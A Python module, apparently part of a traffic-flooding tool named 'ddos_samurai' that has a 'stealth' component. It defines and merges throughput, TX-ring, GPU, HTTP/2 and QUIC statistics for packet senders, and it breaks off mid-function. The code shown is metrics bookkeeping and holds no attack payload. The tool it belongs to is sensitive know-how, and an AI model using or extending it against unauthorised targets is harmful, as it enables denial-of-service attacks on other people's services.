import asyncio
import inspect
import time
import os
import logging
import multiprocessing
import random
import json

from datetime import datetime

from ddos_samurai import packet
from ddos_samurai import senders
from ddos_samurai import stealth
from ddos_samurai import cpu_packet_engine
from ddos_samurai import dataplane


from ddos_samurai import utils
from ddos_samurai.pacing import (
    PacingConfig, PacingMode, JitterModel,
    PACING_ENGINE_AVAILABLE,
)
log_info = utils.log_info
log_error = utils.log_error
log_warning = utils.log_warning


# Map CLI string values → enum values
_PACING_MODE_MAP = {
    "none": PacingMode.NONE,
    "rps": PacingMode.RPS,
    "ipg": PacingMode.IPG,
    "burst": PacingMode.BURST,
}
_JITTER_MODEL_MAP = {
    "none": JitterModel.NONE,
    "uniform": JitterModel.UNIFORM,
    "gaussian": JitterModel.GAUSSIAN,
    "exponential": JitterModel.EXPONENTIAL,
}


def _empty_stats() -> dict:
    return {
        "attempted": 0,
        "sent": 0,
        "errors": 0,
        "bytes_sent_est": 0,
        "buffer_copy_count": 0,
        "buffer_copy_bytes": 0,
        "eagain_retry_count": 0,
        "partial_send_retry_count": 0,
        "buffer_reuse_hits": 0,
        "sender_fallback_reason": "none",
        "sender_backend_requested": "auto",
        "sender_fallback_policy": "allow",
        "actual_rps": 0.0,
        "rate_accuracy_pct": 0.0,
        "jitter_p99_ns": 0.0,
        "ipg_mean_ns": 0.0,
        "sleep_calls": 0,
        "busywait_cycles": 0,
        "so_txtime_active": 0,
        "txtime_errors": 0,
        "txring_flush_call_count": 0,
        "txring_flush_error_count": 0,
        "txring_flush_eagain_count": 0,
        "txring_flush_enobufs_count": 0,
        "txring_flush_ebusy_count": 0,
        "txring_flush_other_errno_count": 0,
        "txring_flush_last_errno": 0,
        "txring_flush_last_errno_name": "NONE",
        "txring_frame_wait_ns": 0,
        "txring_poll_count": 0,
        "flush_mode": "unknown",
        "txring_tp_packets": 0,
        "txring_tp_drops": 0,
        "txring_tp_freeze_q_cnt": 0,
        "txring_packet_version": 0,
        "txring_packet_version_name": "TPACKET_UNKNOWN",
        "afpacket_hugepage_mode": "off",
        "afpacket_hugepage_effective": 0,
        "afpacket_hugepage_reason": "none",
        "afpacket_hugepage_size_kb": 0,
        "afpacket_madvise_hugepage_ok": 0,
        "afpacket_mlock_ok": 0,
        "afpacket_prefault_pages": 0,
        "afpacket_smaps_kernel_page_kb": 0,
        "afpacket_smaps_anon_hugepages_kb": 0,
        "afpacket_ring_block_size": 0,
        "afpacket_ring_block_nr": 0,
        "afpacket_ring_size_bytes": 0,
        "txring_batch_target": 0,
        "txring_backoff_ns": 0,
        "host_tx_packets_delta": 0,
        "host_tx_dropped_delta": 0,
        "host_tx_errors_delta": 0,
        "softnet_dropped_delta": 0,
        "softnet_time_squeeze_delta": 0,
        "wire_counter_available": 0,
        "wire_counter_source": "none",
        "wire_counter_confidence": 0.0,
        "wire_counter_reason": "",
        "wire_tx_packets_delta": 0,
        "wire_tx_dropped_delta": 0,
        "wire_tx_errors_delta": 0,
        "wire_tx_bytes_delta": 0,
        "nicq_counter_available": 0,
        "nicq_counter_source": "none",
        "nicq_counter_confidence": 0.0,
        "nicq_counter_reason": "",
        "nicq_pressure_delta": 0,
        "nicq_drop_delta": 0,
        "nicq_fifo_delta": 0,
        "nicq_timeout_delta": 0,
        "nicq_restart_delta": 0,
        "nicq_busy_delta": 0,
        "nicq_pressure_status": "unknown",
        "wire_tx_accounted_packets": 0,
        "wire_tx_over_attempted_packets": 0,
        "wire_loss_measurement_mode": "unknown",
        "wire_loss_est_packets": 0,
        "wire_loss_est_pct": 0.0,
        "wire_loss_raw_packets": 0,
        "wire_loss_raw_uncapped_packets": 0,
        "wire_loss_raw_pct": 0.0,
        "wire_loss_raw_pct_of_attempted": 0.0,
        "wire_loss_raw_over_attempted_packets": 0,
        "wire_loss_raw_over_attempted_pct": 0.0,
        "wire_loss_raw_gt_attempted": 0,
        "wire_loss_estimation_capped": 0,
        "txring_drop_ratio_pct": 0.0,
        "txring_flush_error_ratio_pct": 0.0,
        "txring_flush_eagain_ratio_pct": 0.0,
        "txring_flush_enobufs_ratio_pct": 0.0,
        "txring_flush_ebusy_ratio_pct": 0.0,
        "txring_flush_other_errno_ratio_pct": 0.0,
        "sender_path": "",
        "gpu_packet_backend_name": "",
        "gpu_packet_native_enabled": 0,
        "gpu_packet_native_library_available": 0,
        "gpu_packet_native_active": 0,
        "gpu_template_h2d_copy_count": 0,
        "gpu_template_h2d_copy_bytes": 0,
        "gpu_rng_state_alloc_count": 0,
        "gpu_rng_state_reuse_count": 0,
        "gpu_ring_depth_peak": 0,
        "gpu_ring_block_wait_ns": 0,
        "state_active_entries": 0,
        "state_timeout_evictions": 0,
        "state_overwrites": 0,
        "l7_active_sessions_peak": 0,
        "l7_conn_rate": 0.0,
        "l7_handshake_p99_ms": 0.0,
        "l7_step_fail_ratio": 0.0,
        "session_success_rate": 0.0,
        "retry_success_rate": 0.0,
        "l7_engine_path_used": "",
        "l7_fallback_reason": "none",
        "l7_capability_status": "ok",
        "h2_goaway_count": 0,
        "h2_stream_resets": 0,
        "h2_connections_used": 0,
        "h2_request_plan_used": 0,
        "h2_request_plan_items": 0,
        "h2_stream_reset_ratio": 0.0,
        "quic_connect_fail_count": 0,
        "quic_connect_timeout_count": 0,
        "quic_tls_fail_count": 0,
        "quic_handshake_timeout_count": 0,
        "quic_stream_fail_count": 0,
        "quic_stream_fail_ratio": 0.0,
        "quic_handshake_fail_ratio": 0.0,
        "quic_response_headers_ok_count": 0,
        "quic_response_body_ok_count": 0,
        "quic_response_expected_header_ok_count": 0,
        "quic_response_expected_body_match_ok_count": 0,
        "quic_response_validation_fail_count": 0,
        "quic_response_validation_fail_ratio": 0.0,
        "quic_connection_attempts": 0,
        "quic_conn_pool_size": 1,
        "quic_stack_mode": "",
        "dp_queue_id": -1,
        "dp_queue_strategy": "unknown",
        "dp_affinity_cpu": -1,
    }


def _recompute_loss_metrics(d: dict) -> dict:
    out = dict(d or {})
    attempted = max(0, int(out.get("attempted", 0) or 0))
    tx_packets = max(0, int(out.get("txring_tp_packets", 0) or 0))
    tx_drops = max(0, int(out.get("txring_tp_drops", 0) or 0))
    wire_tx_packets = max(0, int(out.get("wire_tx_packets_delta", 0) or 0))
    wire_counter_available = int(
        bool(
            int(
                out.get(
                    "wire_counter_available",
                    1 if ("wire_tx_packets_delta" in out or "host_tx_packets_delta" in out) else 0,
                )
                or 0
            )
        )
    )
    wire_counter_confidence = max(0.0, min(1.0, float(out.get("wire_counter_confidence", 0.0) or 0.0)))
    wire_counter_source = str(out.get("wire_counter_source", "none") or "none")
    wire_counter_reason = str(out.get("wire_counter_reason", "") or "")
    nicq_counter_available = int(
        bool(
            int(
                out.get(
                    "nicq_counter_available",
                    1 if ("nicq_pressure_delta" in out or "nicq_drop_delta" in out) else 0,
                )
                or 0
            )
        )
    )
    nicq_counter_confidence = max(0.0, min(1.0, float(out.get("nicq_counter_confidence", 0.0) or 0.0)))
    nicq_counter_source = str(out.get("nicq_counter_source", "none") or "none")
    nicq_counter_reason = str(out.get("nicq_counter_reason", "") or "")
    nicq_drop_delta = max(0, int(out.get("nicq_drop_delta", 0) or 0))
    nicq_fifo_delta = max(0, int(out.get("nicq_fifo_delta", 0) or 0))
    nicq_timeout_delta = max(0, int(out.get("nicq_timeout_delta", 0) or 0))
    nicq_restart_delta = max(0, int(out.get("nicq_restart_delta", 0) or 0))
    nicq_busy_delta = max(0, int(out.get("nicq_busy_delta", 0) or 0))
    nicq_pressure_delta = max(0, int(out.get("nicq_pressure_delta", 0) or 0))
    nicq_pressure_delta = max(
        nicq_pressure_delta,
        nicq_drop_delta + nicq_fifo_delta + nicq_timeout_delta + nicq_restart_delta + nicq_busy_delta,
    )
    legacy_host_tx_packets = max(0, int(out.get("host_tx_packets_delta", 0) or 0))
    if (
        wire_counter_available
        and wire_tx_packets <= 0
        and wire_counter_source in ("", "none", "unknown", "legacy_host_tx_packets")
        and legacy_host_tx_packets > 0
    ):
        wire_tx_packets = legacy_host_tx_packets
        wire_counter_source = "legacy_host_tx_packets"
        wire_counter_confidence = max(wire_counter_confidence, 0.5)
        if not wire_counter_reason:
            wire_counter_reason = "wire_tx_packets_missing_using_host_tx_packets_delta"
    host_tx_dropped = max(0, int(out.get("host_tx_dropped_delta", 0) or 0))
    existing_est = max(0, int(out.get("wire_loss_est_packets", 0) or 0))
    existing_raw = max(
        0,
        int(out.get("wire_loss_raw_packets", 0) or 0),
        int(out.get("wire_loss_raw_uncapped_packets", 0) or 0),
    )
    flush_calls = max(0, int(out.get("txring_flush_call_count", 0) or 0))
    flush_errors = max(0, int(out.get("txring_flush_error_count", 0) or 0))
    flush_eagain = max(0, int(out.get("txring_flush_eagain_count", 0) or 0))
    flush_enobufs = max(0, int(out.get("txring_flush_enobufs_count", 0) or 0))
    flush_ebusy = max(0, int(out.get("txring_flush_ebusy_count", 0) or 0))
    flush_other_errno = max(0, int(out.get("txring_flush_other_errno_count", 0) or 0))

    tx_drops_bounded = min(tx_drops, tx_packets) if tx_packets > 0 else tx_drops
    wire_tx_accounted_packets = min(attempted, wire_tx_packets) if wire_counter_available else 0
    wire_tx_over_attempted_packets = max(0, wire_tx_packets - attempted) if wire_counter_available else 0
    if wire_counter_available:
        derived_raw_loss = max(0, attempted - wire_tx_accounted_packets)
        raw_loss_packets = max(existing_raw, derived_raw_loss)
        est_loss_packets = min(attempted, max(existing_est, raw_loss_packets))
        measurement_mode = "wire_tx_packets"
    else:
        raw_loss_packets = max(existing_raw, 0)
        est_loss_packets = min(attempted, max(existing_est, 0))
        measurement_mode = "unavailable"
        # Backward compatibility fallback for legacy test inputs with no wire counters.
        if host_tx_dropped > 0:
            raw_loss_packets = max(raw_loss_packets, host_tx_dropped)
            est_loss_packets = min(attempted, max(est_loss_packets, host_tx_dropped))
            measurement_mode = "host_tx_dropped_fallback"

    raw_over_attempted = max(0, raw_loss_packets - attempted)
    raw_over_attempted_pct = float((100.0 * raw_over_attempted) / max(1, attempted))

    out["wire_counter_available"] = int(wire_counter_available)
    out["wire_counter_source"] = str(wire_counter_source)
    out["wire_counter_confidence"] = float(wire_counter_confidence)
    out["wire_counter_reason"] = str(wire_counter_reason)
    out["nicq_counter_available"] = int(nicq_counter_available)
    out["nicq_counter_source"] = str(nicq_counter_source)
    out["nicq_counter_confidence"] = float(nicq_counter_confidence)
    out["nicq_counter_reason"] = str(nicq_counter_reason)
    out["nicq_pressure_delta"] = int(nicq_pressure_delta) if nicq_counter_available else 0
    out["nicq_drop_delta"] = int(nicq_drop_delta) if nicq_counter_available else 0
    out["nicq_fifo_delta"] = int(nicq_fifo_delta) if nicq_counter_available else 0
    out["nicq_timeout_delta"] = int(nicq_timeout_delta) if nicq_counter_available else 0
    out["nicq_restart_delta"] = int(nicq_restart_delta) if nicq_counter_available else 0
    out["nicq_busy_delta"] = int(nicq_busy_delta) if nicq_counter_available else 0
    out["nicq_pressure_status"] = (
        "warn" if int(out["nicq_pressure_delta"]) > 0 else "ok"
    ) if nicq_counter_available else "unknown"
    out["wire_tx_accounted_packets"] = int(wire_tx_accounted_packets)
    out["wire_tx_over_attempted_packets"] = int(wire_tx_over_attempted_packets)
    out["wire_loss_measurement_mode"] = str(measurement_mode)
    out["wire_loss_raw_packets"] = int(raw_loss_packets)
    out["wire_loss_raw_uncapped_packets"] = int(raw_loss_packets)
    out["wire_loss_raw_pct"] = float((100.0 * raw_loss_packets) / max(1, attempted))
    out["wire_loss_raw_pct_of_attempted"] = float(out["wire_loss_raw_pct"])
    out["wire_loss_raw_over_attempted_packets"] = int(raw_over_attempted)
    out["wire_loss_raw_over_attempted_pct"] = float(raw_over_attempted_pct)
    out["wire_loss_raw_gt_attempted"] = int(raw_over_attempted > 0)
    out["wire_loss_est_packets"] = int(est_loss_packets)
    out["wire_loss_est_pct"] = float((100.0 * est_loss_packets) / max(1, attempted))
    out["wire_loss_estimation_capped"] = int(raw_loss_packets > est_loss_packets)
    out["txring_drop_ratio_pct"] = float((100.0 * tx_drops_bounded) / max(1, tx_packets))
    out["txring_flush_error_ratio_pct"] = float((100.0 * flush_errors) / max(1, flush_calls))
    out["txring_flush_eagain_ratio_pct"] = float((100.0 * flush_eagain) / max(1, flush_calls))
    out["txring_flush_enobufs_ratio_pct"] = float((100.0 * flush_enobufs) / max(1, flush_calls))
    out["txring_flush_ebusy_ratio_pct"] = float((100.0 * flush_ebusy) / max(1, flush_calls))
    out["txring_flush_other_errno_ratio_pct"] = float((100.0 * flush_other_errno) / max(1, flush_calls))
    return out


def _add_stats(acc: dict, item: dict) -> dict:
    if not isinstance(item, dict):
        return acc
    acc["attempted"] = int(acc.get("attempted", 0)) + int(item.get("attempted", 0) or 0)
    acc["sent"] = int(acc.get("sent", 0)) + int(item.get("sent", 0) or 0)
    acc["errors"] = int(acc.get("errors", 0)) + int(item.get("errors", 0) or 0)
    acc["bytes_sent_est"] = int(acc.get("bytes_sent_est", 0)) + int(item.get("bytes_sent_est", 0) or 0)
    acc["buffer_copy_count"] = int(acc.get("buffer_copy_count", 0)) + int(item.get("buffer_copy_count", 0) or 0)
    acc["buffer_copy_bytes"] = int(acc.get("buffer_copy_bytes", 0)) + int(item.get("buffer_copy_bytes", 0) or 0)
    acc["eagain_retry_count"] = int(acc.get("eagain_retry_count", 0)) + int(item.get("eagain_retry_count", 0) or 0)
    acc["partial_send_retry_count"] = int(acc.get("partial_send_retry_count", 0)) + int(item.get("partial_send_retry_count", 0) or 0)
    acc["buffer_reuse_hits"] = int(acc.get("buffer_reuse_hits", 0)) + int(item.get("buffer_reuse_hits", 0) or 0)
    item_actual_rps = float(item.get("actual_rps", 0.0) or 0.0)
    if item_actual_rps > 0.0 or float(acc.get("actual_rps", 0.0) or 0.0) == 0.0:
        acc["actual_rps"] = item_actual_rps
    item_rate_accuracy = float(item.get("rate_accuracy_pct", 0.0) or 0.0)
    if item_rate_accuracy > 0.0 or float(acc.get("rate_accuracy_pct", 0.0) or 0.0) == 0.0:
        acc["rate_accuracy_pct"] = item_rate_accuracy
    item_jitter_p99 = float(item.get("jitter_p99_ns", 0.0) or 0.0)
    if item_jitter_p99 > 0.0 or float(acc.get("jitter_p99_ns", 0.0) or 0.0) == 0.0:
        acc["jitter_p99_ns"] = item_jitter_p99
    item_ipg_mean = float(item.get("ipg_mean_ns", 0.0) or 0.0)
    if item_ipg_mean > 0.0 or float(acc.get("ipg_mean_ns", 0.0) or 0.0) == 0.0:
        acc["ipg_mean_ns"] = item_ipg_mean
    acc["sleep_calls"] = int(acc.get("sleep_calls", 0)) + int(item.get("sleep_calls", 0) or 0)
    acc["busywait_cycles"] = int(acc.get("busywait_cycles", 0)) + int(item.get("busywait_cycles", 0) or 0)
    acc["so_txtime_active"] = max(
        int(acc.get("so_txtime_active", 0) or 0),
        int(bool(item.get("so_txtime_active", 0))),
    )
    acc["txtime_errors"] = int(acc.get("txtime_errors", 0)) + int(item.get("txtime_errors", 0) or 0)
    item_fallback_reason = str(item.get("sender_fallback_reason", "") or "").strip()
    if item_fallback_reason:
        curr_reason = str(acc.get("sender_fallback_reason", "") or "").strip()
        if not curr_reason or curr_reason == "none":
            acc["sender_fallback_reason"] = item_fallback_reason
        elif curr_reason != item_fallback_reason and curr_reason != "mixed":
            acc["sender_fallback_reason"] = "mixed"
    item_sender_backend_requested = str(item.get("sender_backend_requested", "") or "").strip()
    if item_sender_backend_requested:
        curr_backend = str(acc.get("sender_backend_requested", "") or "").strip()
        if not curr_backend or curr_backend == "auto":
            acc["sender_backend_requested"] = item_sender_backend_requested
        elif curr_backend != item_sender_backend_requested and curr_backend != "mixed":
            acc["sender_backend_requested"] = "mixed"
    item_sender_fallback_policy = str(item.get("sender_fallback_policy", "") or "").strip()
    if item_sender_fallback_policy:
        curr_policy = str(acc.get("sender_fallback_policy", "") or "").strip()
        if not curr_policy or curr_policy == "allow":
            acc["sender_fallback_policy"] = item_sender_fallback_policy
        elif curr_policy != item_sender_fallback_policy and curr_policy != "mixed":
            acc["sender_fallback_policy"] = "mixed"
    item_gpu_packet_backend_name = str(item.get("gpu_packet_backend_name", "") or "").strip()
    if item_gpu_packet_backend_name:
        curr_gpu_backend = str(acc.get("gpu_packet_backend_name", "") or "").strip()
        if not curr_gpu_backend:
            acc["gpu_packet_backend_name"] = item_gpu_packet_backend_name
        elif curr_gpu_backend != item_gpu_packet_backend_name and curr_gpu_backend != "mixed":
            acc["gpu_packet_backend_name"] = "mixed"
    acc["gpu_packet_native_enabled"] = max(
        int(acc.get("gpu_packet_native_enabled", 0) or 0),
        int(item.get("gpu_packet_native_enabled", 0) or 0),
    )
    acc["gpu_packet_native_library_available"] = max(
        int(acc.get("gpu_packet_native_library_available", 0) or 0),
        int(item.get("gpu_packet_native_library_available", 0) or 0),
    )
    acc["gpu_packet_native_active"] = max(
        int(acc.get("gpu_packet_native_active", 0) or 0),
        int(item.get("gpu_packet_native_active", 0) or 0),
    )
    acc["txring_flush_call_count"] = int(acc.get("txring_flush_call_count", 0)) + int(item.get("txring_flush_call_count", 0) or 0)
    acc["txring_flush_error_count"] = int(acc.get("txring_flush_error_count", 0)) + int(item.get("txring_flush_error_count", 0) or 0)
    acc["txring_flush_eagain_count"] = int(acc.get("txring_flush_eagain_count", 0)) + int(item.get("txring_flush_eagain_count", 0) or 0)
    acc["txring_flush_enobufs_count"] = int(acc.get("txring_flush_enobufs_count", 0)) + int(item.get("txring_flush_enobufs_count", 0) or 0)
    acc["txring_flush_ebusy_count"] = int(acc.get("txring_flush_ebusy_count", 0)) + int(item.get("txring_flush_ebusy_count", 0) or 0)
    acc["txring_flush_other_errno_count"] = int(acc.get("txring_flush_other_errno_count", 0)) + int(item.get("txring_flush_other_errno_count", 0) or 0)
    _item_last_errno = int(item.get("txring_flush_last_errno", 0) or 0)
    _item_last_errno_name = str(item.get("txring_flush_last_errno_name", "") or "").strip()
    if _item_last_errno or _item_last_errno_name:
        acc["txring_flush_last_errno"] = _item_last_errno
        acc["txring_flush_last_errno_name"] = _item_last_errno_name or "OTHER"
    acc["txring_frame_wait_ns"] = int(acc.get("txring_frame_wait_ns", 0)) + int(item.get("txring_frame_wait_ns", 0) or 0)
    acc["txring_poll_count"] = int(acc.get("txring_poll_count", 0)) + int(item.get("txring_poll_count", 0) or 0)
    item_flush_mode = str(item.get("flush_mode", "") or "").strip()
    if item_flush_mode:
        curr_flush_mode = str(acc.get("flush_mode", "") or "").strip()
        if not curr_flush_mode or curr_flush_mode == "unknown":
            acc["flush_mode"] = item_flush_mode
        elif curr_flush_mode != item_flush_mode and curr_flush_mode != "mixed":
            acc["flush_mode"] = "mixed"
    acc["txring_tp_packets"] = int(acc.get("txring_tp_packets", 0)) + int(item.get("txring_tp_packets", 0) or 0)
    acc["txring_tp_drops"] = int(acc.get("txring_tp_drops", 0)) + int(item.get("txring_tp_drops", 0) or 0)
    acc["txring_tp_freeze_q_cnt"] = int(acc.get("txring_tp_freeze_q_cnt", 0)) + int(item.get("txring_tp_freeze_q_cnt", 0) or 0)
    acc["txring_batch_target"] = max(
        int(acc.get("txring_batch_target", 0) or 0),
        int(item.get("txring_batch_target", 0) or 0),
    )
    acc["txring_backoff_ns"] = int(acc.get("txring_backoff_ns", 0)) + int(item.get("txring_backoff_ns", 0) or 0)
    item_txring_ver = int(item.get("txring_packet_version", 0) or 0)
    item_txring_ver_name = str(item.get("txring_packet_version_name", "") or "").strip()
    if item_txring_ver > 0:
        current_ver = int(acc.get("txring_packet_version", 0) or 0)
        current_ver_name = str(acc.get("txring_packet_version_name", "") or "").strip()
        if current_ver <= 0:
            acc["txring_packet_version"] = item_txring_ver
            acc["txring_packet_version_name"] = item_txring_ver_name or "TPACKET_UNKNOWN"
        elif current_ver != item_txring_ver:
            acc["txring_packet_version"] = 0
            acc["txring_packet_version_name"] = "MIXED"
        elif not current_ver_name:
            acc["txring_packet_version_name"] = item_txring_ver_name or "TPACKET_UNKNOWN"
    item_hp_mode = str(item.get("afpacket_hugepage_mode", "") or "").strip().lower()
    if item_hp_mode:
        current_hp_mode = str(acc.get("afpacket_hugepage_mode", "") or "").strip().lower()
        if not current_hp_mode or current_hp_mode in {"off", "none", "unknown"}:
            acc["afpacket_hugepage_mode"] = item_hp_mode
            acc["afpacket_hugepage_effective"] = int(item.get("afpacket_hugepage_effective", 0) or 0)
            acc["afpacket_hugepage_reason"] = str(item.get("afpacket_hugepage_reason", "none") or "none")
        elif current_hp_mode != item_hp_mode and current_hp_mode != "mixed":
            acc["afpacket_hugepage_mode"] = "mixed"
            acc["afpacket_hugepage_reason"] = "mixed"
            acc["afpacket_hugepage_effective"] = min(
                int(acc.get("afpacket_hugepage_effective", 0) or 0),
                int(item.get("afpacket_hugepage_effective", 0) or 0),
            )
        else:
            acc["afpacket_hugepage_effective"] = min(
                int(acc.get("afpacket_hugepage_effective", 0) or 0),
                int(item.get("afpacket_hugepage_effective", 0) or 0),
            )
            item_hp_reason = str(item.get("afpacket_hugepage_reason", "") or "").strip()
            curr_hp_reason = str(acc.get("afpacket_hugepage_reason", "") or "").strip()
            if item_hp_reason:
                if not curr_hp_reason or curr_hp_reason in {"none", "disabled"}:
                    acc["afpacket_hugepage_reason"] = item_hp_reason
                elif curr_hp_reason != item_hp_reason and curr_hp_reason != "mixed":
                    acc["afpacket_hugepage_reason"] = "mixed"
    acc["afpacket_hugepage_size_kb"] = max(
        int(acc.get("afpacket_hugepage_size_kb", 0) or 0),
        int(item.get("afpacket_hugepage_size_kb", 0) or 0),
    )
    acc["afpacket_madvise_hugepage_ok"] = max(
        int(acc.get("afpacket_madvise_hugepage_ok", 0) or 0),
        int(item.get("afpacket_madvise_hugepage_ok", 0) or 0),
    )
    acc["afpacket_mlock_ok"] = max(
        int(acc.get("afpacket_mlock_ok", 0) or 0),
        int(item.get("afpacket_mlock_ok", 0) or 0),
    )
    acc["afpacket_prefault_pages"] = int(acc.get("afpacket_prefault_pages", 0)) + int(
        item.get("afpacket_prefault_pages", 0) or 0
    )
    acc["afpacket_smaps_kernel_page_kb"] = max(
        int(acc.get("afpacket_smaps_kernel_page_kb", 0) or 0),
        int(item.get("afpacket_smaps_kernel_page_kb", 0) or 0),
    )
    acc["afpacket_smaps_anon_hugepages_kb"] = max(
        int(acc.get("afpacket_smaps_anon_hugepages_kb", 0) or 0),
        int(item.get("afpacket_smaps_anon_hugepages_kb", 0) or 0),
    )
    acc["afpacket_ring_block_size"] = max(
        int(acc.get("afpacket_ring_block_size", 0) or 0),
        int(item.get("afpacket_ring_block_size", 0) or 0),
    )
    acc["afpacket_ring_block_nr"] = max(
        int(acc.get("afpacket_ring_block_nr", 0) or 0),
        int(item.get("afpacket_ring_block_nr", 0) or 0),
    )
    acc["afpacket_ring_size_bytes"] = max(
        int(acc.get("afpacket_ring_size_bytes", 0) or 0),
        int(item.get("afpacket_ring_size_bytes", 0) or 0),
    )
    acc["host_tx_packets_delta"] = int(acc.get("host_tx_packets_delta", 0)) + int(item.get("host_tx_packets_delta", 0) or 0)
    acc["host_tx_dropped_delta"] = int(acc.get("host_tx_dropped_delta", 0)) + int(item.get("host_tx_dropped_delta", 0) or 0)
    acc["host_tx_errors_delta"] = int(acc.get("host_tx_errors_delta", 0)) + int(item.get("host_tx_errors_delta", 0) or 0)
    acc["softnet_dropped_delta"] = int(acc.get("softnet_dropped_delta", 0)) + int(item.get("softnet_dropped_delta", 0) or 0)
    acc["softnet_time_squeeze_delta"] = int(acc.get("softnet_time_squeeze_delta", 0)) + int(item.get("softnet_time_squeeze_delta", 0) or 0)
    item_wire_avail = int(
        item.get(
            "wire_counter_available",
            1 if ("wire_tx_packets_delta" in item or "host_tx_packets_delta" in item) else 0,
        )
        or 0
    )
    acc["wire_counter_available"] = max(int(acc.get("wire_counter_available", 0) or 0), item_wire_avail)
    item_wire_source = str(item.get("wire_counter_source", "") or "").strip()
    if item_wire_source:
        curr_wire_source = str(acc.get("wire_counter_source", "") or "").strip()
        if not curr_wire_source or curr_wire_source in ("none", "unknown"):
            acc["wire_counter_source"] = item_wire_source
        elif curr_wire_source != item_wire_source and curr_wire_source != "mixed":
            acc["wire_counter_source"] = "mixed"
    item_wire_reason = str(item.get("wire_counter_reason", "") or "").strip()
    if item_wire_reason:
        curr_wire_reason = str(acc.get("wire_counter_reason", "") or "").strip()
        if not curr_wire_reason:
            acc["wire_counter_reason"] = item_wire_reason
        elif item_wire_reason not in curr_wire_reason:
            acc["wire_counter_reason"] = f"{curr_wire_reason};{item_wire_reason}"
    acc["wire_counter_confidence"] = max(
        float(acc.get("wire_counter_confidence", 0.0) or 0.0),
        float(item.get("wire_counter_confidence", 0.0) or 0.0),
    )
    acc["wire_tx_packets_delta"] = int(acc.get("wire_tx_packets_delta", 0)) + int(item.get("wire_tx_packets_delta", 0) or 0)
    acc["wire_tx_dropped_delta"] = int(acc.get("wire_tx_dropped_delta", 0)) + int(item.get("wire_tx_dropped_delta", 0) or 0)
    acc["wire_tx_errors_delta"] = int(acc.get("wire_tx_errors_delta", 0)) + int(item.get("wire_tx_errors_delta", 0) or 0)
    acc["wire_tx_bytes_delta"] = int(acc.get("wire_tx_bytes_delta", 0)) + int(item.get("wire_tx_bytes_delta", 0) or 0)
    item_nicq_avail = int(
        item.get(
            "nicq_counter_available",
            1 if ("nicq_pressure_delta" in item or "nicq_drop_delta" in item) else 0,
        )
        or 0
    )
    acc["nicq_counter_available"] = max(int(acc.get("nicq_counter_available", 0) or 0), item_nicq_avail)
    item_nicq_source = str(item.get("nicq_counter_source", "") or "").strip()
    if item_nicq_source:
        curr_nicq_source = str(acc.get("nicq_counter_source", "") or "").strip()
        if not curr_nicq_source or curr_nicq_source in ("none", "unknown"):
            acc["nicq_counter_source"] = item_nicq_source
        elif curr_nicq_source != item_nicq_source and curr_nicq_source != "mixed":
            acc["nicq_counter_source"] = "mixed"
    item_nicq_reason = str(item.get("nicq_counter_reason", "") or "").strip()
    if item_nicq_reason:
        curr_nicq_reason = str(acc.get("nicq_counter_reason", "") or "").strip()
        if not curr_nicq_reason:
            acc["nicq_counter_reason"] = item_nicq_reason
        elif item_nicq_reason not in curr_nicq_reason:
            acc["nicq_counter_reason"] = f"{curr_nicq_reason};{item_nicq_reason}"
    acc["nicq_counter_confidence"] = max(
        float(acc.get("nicq_counter_confidence", 0.0) or 0.0),
        float(item.get("nicq_counter_confidence", 0.0) or 0.0),
    )
    acc["nicq_pressure_delta"] = int(acc.get("nicq_pressure_delta", 0)) + int(item.get("nicq_pressure_delta", 0) or 0)
    acc["nicq_drop_delta"] = int(acc.get("nicq_drop_delta", 0)) + int(item.get("nicq_drop_delta", 0) or 0)
    acc["nicq_fifo_delta"] = int(acc.get("nicq_fifo_delta", 0)) + int(item.get("nicq_fifo_delta", 0) or 0)
    acc["nicq_timeout_delta"] = int(acc.get("nicq_timeout_delta", 0)) + int(item.get("nicq_timeout_delta", 0) or 0)
    acc["nicq_restart_delta"] = int(acc.get("nicq_restart_delta", 0)) + int(item.get("nicq_restart_delta", 0) or 0)
    acc["nicq_busy_delta"] = int(acc.get("nicq_busy_delta", 0)) + int(item.get("nicq_busy_delta", 0) or 0)
    acc["wire_loss_est_packets"] = int(acc.get("wire_loss_est_packets", 0)) + int(item.get("wire_loss_est_packets", 0) or 0)
    _raw_uncapped = int(item.get("wire_loss_raw_uncapped_packets", item.get("wire_loss_raw_packets", 0)) or 0)
    acc["wire_loss_raw_packets"] = int(acc.get("wire_loss_raw_packets", 0)) + int(
        item.get("wire_loss_raw_packets", _raw_uncapped) or 0
    )
    acc["wire_loss_raw_uncapped_packets"] = int(acc.get("wire_loss_raw_uncapped_packets", 0)) + _raw_uncapped
    acc["gpu_template_h2d_copy_count"] = int(acc.get("gpu_template_h2d_copy_count", 0)) + int(item.get("gpu_template_h2d_copy_count", 0) or 0)
    acc["gpu_template_h2d_copy_bytes"] = int(acc.get("gpu_template_h2d_copy_bytes", 0)) + int(item.get("gpu_template_h2d_copy_bytes", 0) or 0)
    acc["gpu_rng_state_alloc_count"] = int(acc.get("gpu_rng_state_alloc_count", 0)) + int(item.get("gpu_rng_state_alloc_count", 0) or 0)
    acc["gpu_rng_state_reuse_count"] = int(acc.get("gpu_rng_state_reuse_count", 0)) + int(item.get("gpu_rng_state_reuse_count", 0) or 0)
    acc["gpu_ring_depth_peak"] = max(
        int(acc.get("gpu_ring_depth_peak", 0) or 0),
        int(item.get("gpu_ring_depth_peak", 0) or 0),
    )
    acc["gpu_ring_block_wait_ns"] = int(acc.get("gpu_ring_block_wait_ns", 0)) + int(item.get("gpu_ring_block_wait_ns", 0) or 0)
    acc["l7_active_sessions_peak"] = max(
        int(acc.get("l7_active_sessions_peak", 0) or 0),
        int(item.get("l7_active_sessions_peak", 0) or 0),
    )
    item_l7_conn_rate = float(item.get("l7_conn_rate", 0.0) or 0.0)
    if item_l7_conn_rate > 0.0 or float(acc.get("l7_conn_rate", 0.0) or 0.0) == 0.0:
        acc["l7_conn_rate"] = item_l7_conn_rate
    acc["l7_handshake_p99_ms"] = max(
        float(acc.get("l7_handshake_p99_ms", 0.0) or 0.0),
        float(item.get("l7_handshake_p99_ms", 0.0) or 0.0),
    )
    item_l7_step_fail_ratio = float(item.get("l7_step_fail_ratio", 0.0) or 0.0)
    if item_l7_step_fail_ratio > 0.0 or float(acc.get("l7_step_fail_ratio", 0.0) or 0.0) == 0.0:
        acc["l7_step_fail_ratio"] = item_l7_step_fail_ratio
    item_session_success_rate = float(item.get("session_success_rate", 0.0) or 0.0)
    if item_session_success_rate > 0.0 or float(acc.get("session_success_rate", 0.0) or 0.0) == 0.0:
        acc["session_success_rate"] = item_session_success_rate
    item_retry_success_rate = float(item.get("retry_success_rate", 0.0) or 0.0)
